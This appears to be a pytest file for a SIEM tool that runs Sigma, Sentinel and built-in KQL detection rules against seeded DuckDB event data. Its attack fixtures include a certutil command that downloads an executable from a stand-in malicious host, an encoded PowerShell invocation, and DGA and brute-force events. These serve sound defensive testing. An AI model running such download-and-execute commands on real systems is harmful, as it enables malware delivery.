"""Detection rule behavior tests on real DuckDB data.

Motivation: existing sigma/sentinel tests check compilation and rule structure,
but the only end-to-end execution tests are test_sigma_import.py (which does
exercise alerts) and test_detect_kql.py (which uses synthetic data).  These
additional tests fill gaps by:
  - running Sentinel-to-KQL rules on real data
  - testing no-false-positive scenarios with benign data
  - testing builtin KQL rules against hand-seeded fixture data
"""
from __future__ import annotations

import json

import pytest

from siempl.db import Database, utcnow
from siempl.detect import RuleRunner
from siempl.detect.builtin import BUILTIN_RULES
from siempl.detect.engine import RuleStore, sentinel_to_rule, sigma_to_rule
from siempl.detect.importer import import_rules
from siempl.kql import compile_kql, run_kql


@pytest.fixture
def db(tmp_path):
    return Database(str(tmp_path / "t.duckdb"))


# ── helpers ──────────────────────────────────────────────────────────────────

def _insert_benign_process(db: Database) -> None:
    """Benign process events that should NOT match attack rules."""
    now = utcnow()
    db.execute(
        'INSERT INTO "ProcessEvents" (TimeGenerated, SourceId, SourceType, '
        'ProcessName, ProcessPath, ProcessCmdLine, HostName, UserName) '
        'VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        [now, 'benign', 'test', 'chrome.exe',
         'C:\\Program Files\\Google\\Chrome\\chrome.exe',
         'chrome.exe https://google.com', 'WS01', 'alice'])


def _insert_attack_process(db: Database) -> None:
    """Process events that should match multiple Sigma attack rules."""
    now = utcnow()
    rows = [
        # certutil download (should match certutil rule)
        (now, 'atk', 'test', 'certutil.exe',
         'C:\\Windows\\System32\\certutil.exe',
         'certutil.exe -urlcache -split -f http://evil.example/x.exe',
         'WS01', 'alice'),
        # encoded powershell
        (now, 'atk2', 'test', 'powershell.exe',
         'C:\\Windows\\System32\\powershell.exe',
         'powershell.exe -enc SQBFAFgA', 'WS02', 'bob'),
        # office spawn from temp
        (now, 'atk3', 'test', 'cmd.exe',
         'C:\\Windows\\System32\\cmd.exe',
         'cmd.exe /c dir', 'WS03', 'carol',
         json.dumps({"ParentImage": (
             "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
             "CurrentDirectory": "C:\\Users\\carol\\AppData\\Local\\Temp"})),
    ]
    for r in rows[:2]:
        db.execute(
            'INSERT INTO "ProcessEvents" '
            '(TimeGenerated, SourceId, SourceType, ProcessName, ProcessPath, '
            'ProcessCmdLine, HostName, UserName) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
            r)
    # Third row has Extra JSON
    db.execute(
        'INSERT INTO "ProcessEvents" '
        '(TimeGenerated, SourceId, SourceType, ProcessName, ProcessPath, '
        'ProcessCmdLine, HostName, UserName, Extra) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
        rows[2])


def _insert_network_fixture(db: Database) -> None:
    now = utcnow()
    # bad ip + port
    db.execute(
        'INSERT INTO "NetworkEvents" '
        '(TimeGenerated, SourceId, SourceType, DstIp, DstPort, ProcessName) '
        'VALUES (?, ?, ?, ?, ?, ?)',
        [now, 'net-bad', 'test', '185.220.101.4', 443, 'powershell.exe'])
    # benign
    db.execute(
        'INSERT INTO "NetworkEvents" '
        '(TimeGenerated, SourceId, SourceType, DstIp, DstPort, ProcessName) '
        'VALUES (?, ?, ?, ?, ?, ?)',
        [now, 'net-good', 'test', '8.8.8.8', 443, 'chrome.exe'])
    # dyndns query
    db.execute(
        'INSERT INTO "NetworkEvents" '
        '(TimeGenerated, SourceId, SourceType, DnsQuery, ProcessName) '
        'VALUES (?, ?, ?, ?, ?)',
        [now, 'dns-bad', 'test', 'evil.duckdns.org', 'chrome.exe'])
    # corp dyndns (filtered)
    db.execute(
        'INSERT INTO "NetworkEvents" '
        '(TimeGenerated, SourceId, SourceType, DnsQuery, ProcessName) '
        'VALUES (?, ?, ?, ?, ?)',
        [now, 'dns-good', 'test', 'host.corp.duckdns.org', 'chrome.exe'])


def _insert_auth_fixture(db: Database) -> None:
    now = utcnow()
    db.execute(
        'INSERT INTO "AuthEvents" '
        '(TimeGenerated, SourceId, SourceType, EventCode, EventResult, '
        'UserName, SrcIp, Extra) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        [now, 'auth-bad', 'test', '4625', 'failure', 'admin', '10.0.0.9',
         json.dumps({"LogonType": "3"})])
    db.execute(
        'INSERT INTO "AuthEvents" '
        '(TimeGenerated, SourceId, SourceType, EventCode, EventResult, '
        'UserName, SrcIp, Extra) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        [now, 'auth-good', 'test', '4624', 'success', 'alice', '10.0.0.5',
         json.dumps({"LogonType": "3"})])


# ── Sigma rules on real data ─────────────────────────────────────────────────

class TestSigmaRulesRealData:
    @pytest.fixture(autouse=True)
    def _setup(self, db):
        self.db = db
        _insert_attack_process(db)
        _insert_network_fixture(db)
        _insert_auth_fixture(db)

    def _import_and_run(self, yml: str) -> tuple[str, int, int]:
        rule = sigma_to_rule(yml, backend="kql")
        summary = import_rules(self.db, [rule], enable=True)
        assert summary["imported"] == 1, summary
        store = RuleStore(self.db)
        rid = [r for r in store.list() if r["name"] == rule["name"]][0]["rule_id"]
        runner = RuleRunner(self.db)
        alerts = runner.run_rule(rid)
        row = self.db.query_one(
            "SELECT row_count FROM alerts WHERE rule_id=? ORDER BY created_at DESC LIMIT 1",
            [rid])
        evidence = int(row["row_count"]) if row else 0
        return rid, len(alerts), evidence

    def test_certutil_alerts(self):
        yml = ("title: Certutil Download\n"
               "logsource: {category: process_creation, product: windows}\n"
               "detection:\n"
               "  sel_img:\n    Image|endswith: '\\certutil.exe'\n"
               "  sel_cli:\n    CommandLine|contains|all:\n      - '-urlcache'\n"
               "      - 'http'\n  condition: sel_img and sel_cli\nlevel: high\n")
        rid, n_alerts, evidence = self._import_and_run(yml)
        assert n_alerts >= 1, f"certutil rule should alert, got {n_alerts}"
        assert evidence >= 1

    def test_encoded_powershell_alerts(self):
        yml = ("title: Encoded PS\n"
               "logsource: {category: process_creation, product: windows}\n"
               "detection:\n"
               "  s1:\n    CommandLine|contains: '-enc '\n"
               "  s2:\n    CommandLine|contains: '-ec '\n"
               "  condition: 1 of s*\nlevel: medium\n")
        rid, n_alerts, evidence = self._import_and_run(yml)
        assert n_alerts >= 1
        assert evidence >= 1

    def test_network_bad_ip_alerts(self):
        yml = ("title: Bad IP Conn\n"
               "logsource: {category: network_connection, product: windows}\n"
               "detection:\n"
               "  sel:\n    DestinationIp: ['185.220.101.4']\n"
               "  condition: sel\nlevel: high\n")
        rid, n_alerts, evidence = self._import_and_run(yml)
        assert n_alerts >= 1

    def test_failed_logon_alerts(self):
        yml = ("title: Failed Logon Type 3\n"
               "logsource: {category: authentication, product: windows}\n"
               "detection:\n"
               "  s1:\n    EventID: 4625\n    LogonType: '3'\n"
               "  condition: s1\nlevel: informational\n")
        rid, n_alerts, evidence = self._import_and_run(yml)
        assert n_alerts >= 1

    def test_dyndns_alerts(self):
        yml = ("title: DynDNS Query\n"
               "logsource: {category: dns_query, product: windows}\n"
               "detection:\n"
               "  sel:\n    QueryName|endswith: '.duckdns.org'\n"
               "  filter:\n    QueryName|contains: '.corp.'\n"
               "  condition: sel and not filter\nlevel: low\n")
        rid, n_alerts, evidence = self._import_and_run(yml)
        assert n_alerts >= 1

    def test_no_false_positive_benign_process(self, db):
        _insert_benign_process(db)
        yml = ("title: Chrome Should Not Alert\n"
               "logsource: {category: process_creation, product: windows}\n"
               "detection:\n"
               "  s1:\n    Image|endswith: '\\msbuild.exe'\n"
               "  condition: s1\nlevel: high\n")
        rid, n_alerts, _ = self._import_and_run(yml)
        assert n_alerts == 0


# ── Sentinel rules on real data ──────────────────────────────────────────────

class TestSentinelRulesRealData:
    def test_sentinel_kql_runs_and_alerts(self, db):
        now = utcnow()
        db.execute(
            'INSERT INTO "AuthEvents" '
            '(TimeGenerated, SourceId, SourceType, EventCode, EventResult, '
            'UserName, SrcIp) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [now, 'sent-src', 'test', '4625', 'failure', 'admin', '10.0.0.1'])
        yml = (
            "id: test-123\nname: Sentinel Failed Logon\n"
            "description: Detect failed logons\nseverity: Low\n"
            "requiredDataConnectors:\n"
            "  - connectorId: AzureActivity\n    dataTypes: [AzureActivity]\n"
            "query: |\n"
            "  SecurityEvent\n"  # Sentinel table name, maps to AuthEvents
            "  | where EventResult == 'failure'\n")
        rule = sentinel_to_rule(yml)
        assert rule["origin"] == "sentinel"
        assert "AuthEvents" in str(rule["tables"])
        summary = import_rules(db, [rule], enable=True)
        assert summary["imported"] == 1
        store = RuleStore(db)
        rid = [r for r in store.list() if r["name"] == "Sentinel Failed Logon"][0]["rule_id"]
        runner = RuleRunner(db)
        alerts = runner.run_rule(rid)
        assert len(alerts) >= 1

    def test_sentinel_mapped_columns_are_identifiers_not_strings(self, db):
        """EventID must map to the EventCode column, not the string literal "EventCode"."""
        mapped = sentinel_to_rule(
            "id: c\nname: Col Map\nseverity: Low\n"
            "query: |\n  SecurityEvent\n  | where EventID == '4625' and Account == 'admin'\n")
        assert '"EventCode"' not in mapped["query"]
        assert '"UserName"' not in mapped["query"]
        now = utcnow()
        for code, user in (("4625", "admin"), ("4624", "admin"), ("4625", "bob")):
            db.execute(
                'INSERT INTO "AuthEvents" (TimeGenerated, SourceId, SourceType, EventCode, '
                'EventResult, UserName, SrcIp) VALUES (?, ?, ?, ?, ?, ?, ?)',
                [now, "s", "test", code, "failure", user, "10.0.0.9"])
        n = db.query_one("SELECT count(*) AS n FROM (" + compile_kql(mapped["query"]).sql + ")")
        assert n["n"] == 1  # only the 4625/admin row matches

    def test_sentinel_string_literals_are_not_rewritten(self):
        rule = sentinel_to_rule(
            "id: l\nname: Lit\nseverity: Low\n"
            "query: |\n  SecurityEvent\n  | where Activity == 'Account EventID'\n")
        assert "'Account EventID'" in rule["query"]
        assert "EventAction ==" in rule["query"]

    def test_sentinel_account_entity_fires_and_creates_user_entity(self, db):
        """Entity type Account maps to our 'user' type; the rule fires without error."""
        now = utcnow()
        db.execute(
            'INSERT INTO "AuthEvents" (TimeGenerated, SourceId, SourceType, EventCode, '
            'EventResult, UserName, SrcIp) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [now, "s", "test", "4625", "failure", "alice", "10.0.0.7"])
        yml = (
            "id: acct-1\nname: Sentinel Account Entity\nseverity: Low\n"
            "query: |\n  SecurityEvent\n  | where EventID == '4625'\n"
            "entityMappings:\n  - entityType: Account\n    fieldMappings:\n"
            "      - identifier: FullName\n        columnName: Account\n")
        rule = sentinel_to_rule(yml)
        assert rule["entity_mappings"] == [{"entity_type": "user", "column": "UserName"}]
        import_rules(db, [rule], enable=True)
        rid = [r for r in RuleStore(db).list() if r["name"] == "Sentinel Account Entity"][0]["rule_id"]
        alerts = RuleRunner(db).run_rule(rid)
        assert len(alerts) >= 1
        row = db.query_one("SELECT entities FROM alerts WHERE alert_id = ?", [alerts[0]])
        entities = json.loads(row["entities"]) if isinstance(row["entities"], str) else row["entities"]
        assert {"type": "user", "value": "alice"} in entities

    def test_sentinel_unstorable_entity_types_are_skipped(self):
        rule = sentinel_to_rule(
            "id: u\nname: Url Ent\nseverity: Low\n"
            "query: |\n  SecurityEvent\n  | where EventID == 1\n"
            "entityMappings:\n  - entityType: URL\n    fieldMappings:\n"
            "      - identifier: Url\n        columnName: Url\n")
        assert rule["entity_mappings"] == []

    def test_sentinel_no_query_raises(self):
        with pytest.raises(Exception, match="no 'query' field"):
            sentinel_to_rule("id: x\nname: X\nseverity: Low\n")


# ── Builtin KQL rules on seeded fixture data ─────────────────────────────────

class TestBuiltinKqlRulesRealData:
    @pytest.fixture(autouse=True)
    def _setup(self, db):
        self.db = db
        # Seed data for "Repeated Failed Logins" rule
        now = utcnow()
        for i in range(15):
            db.execute(
                'INSERT INTO "AuthEvents" '
                '(TimeGenerated, SourceId, SourceType, EventResult, UserName, TargetUserName, SrcIp, AuthMethod, EventAction) '
                'VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                [now, 'brute', 'test', 'failure', 'admin', 'admin', '203.0.113.99', 'ssh', 'login'])
        # Seed data for "DGA" rule (50 distinct queries so dcount approx >= 30)
        for i in range(50):
            db.execute(
                'INSERT INTO "NetworkEvents" '
                '(TimeGenerated, SourceId, SourceType, DnsQuery, SrcIp, HostName, ProcessName) '
                'VALUES (?, ?, ?, ?, ?, ?, ?)',
                [now, 'dga', 'test', f"host{i}.evil.com", '10.0.0.1', 'ws01', 'chrome.exe'])

    def test_builtin_repeated_failed_logins_fires(self):
        rule = next(r for r in BUILTIN_RULES if "Repeated Failed Logins" in r["name"])
        compile_kql(rule["query"])  # must compile
        summary = import_rules(self.db, [rule], enable=True)
        assert summary["imported"] == 1
        store = RuleStore(self.db)
        rid = [r for r in store.list() if r["name"] == rule["name"]][0]["rule_id"]
        runner = RuleRunner(self.db)
        alerts = runner.run_rule(rid)
        assert len(alerts) >= 1, "Repeated Failed Logins should fire on 15 failures"

    def test_builtin_dga_fires(self):
        rule = next(r for r in BUILTIN_RULES if "DGA" in r["name"])
        compile_kql(rule["query"])
        summary = import_rules(self.db, [rule], enable=True)
        assert summary["imported"] == 1
        store = RuleStore(self.db)
        rid = [r for r in store.list() if r["name"] == rule["name"]][0]["rule_id"]
        runner = RuleRunner(self.db)
        alerts = runner.run_rule(rid)
        assert len(alerts) >= 1, "DGA rule should fire on 30 distinct DNS queries"

    def test_builtin_no_crash_on_empty_data(self):
        """Rules that expect data we didn't seed should run without crashing."""
        # Port Scan rule needs many distinct ports from one IP
        rule = next(r for r in BUILTIN_RULES if "Port Scan" in r["name"])
        compile_kql(rule["query"])
        summary = import_rules(self.db, [rule], enable=True)
        assert summary["imported"] == 1
        store = RuleStore(self.db)
        rid = [r for r in store.list() if r["name"] == rule["name"]][0]["rule_id"]
        runner = RuleRunner(self.db)
        alerts = runner.run_rule(rid)
        # On our fixture it won't fire, but must not error
        assert isinstance(alerts, list)


# ── KQL-only detection without RuleRunner ────────────────────────────────────

class TestKqlDetectionDirect:
    """Skip RuleRunner and run detection KQL directly against seeded data."""

    def test_brute_force_kql_returns_rows(self, db):
        now = utcnow()
        for i in range(15):
            db.execute(
                'INSERT INTO "AuthEvents" '
                '(TimeGenerated, SourceId, SourceType, EventResult, UserName, SrcIp, AuthMethod) '
                'VALUES (?, ?, ?, ?, ?, ?, ?)',
                [now, 'brute', 'test', 'failure', 'admin', '203.0.113.99', 'ssh'])
        rows = run_kql(db, """
            AuthEvents
            | where EventResult == 'failure' and AuthMethod == 'ssh'
            | summarize FailedAttempts = count() by SrcIp
            | where FailedAttempts >= 10
            | project SrcIp, FailedAttempts
        """).rows
        assert len(rows) == 1
        assert rows[0][0] == "203.0.113.99"
        assert rows[0][1] == 15

    def test_dga_kql_returns_rows(self, db):
        now = utcnow()
        for i in range(30):
            db.execute(
                'INSERT INTO "NetworkEvents" '
                '(TimeGenerated, SourceId, SourceType, DnsQuery, SrcIp, ProcessName) '
                'VALUES (?, ?, ?, ?, ?, ?)',
                [now, 'dga', 'test', f"host{i}.evil.com", '10.0.0.1', 'chrome.exe'])
        rows = run_kql(db, """
            NetworkEvents
            | where DnsQuery != ''
            | summarize UniqueDomains = dcount(DnsQuery) by SrcIp
            | where UniqueDomains >= 20
            | project SrcIp, UniqueDomains
        """).rows
        assert len(rows) == 1
        assert rows[0][0] == "10.0.0.1"
        # dcount is approximate; 30 distinct values should be >= 20
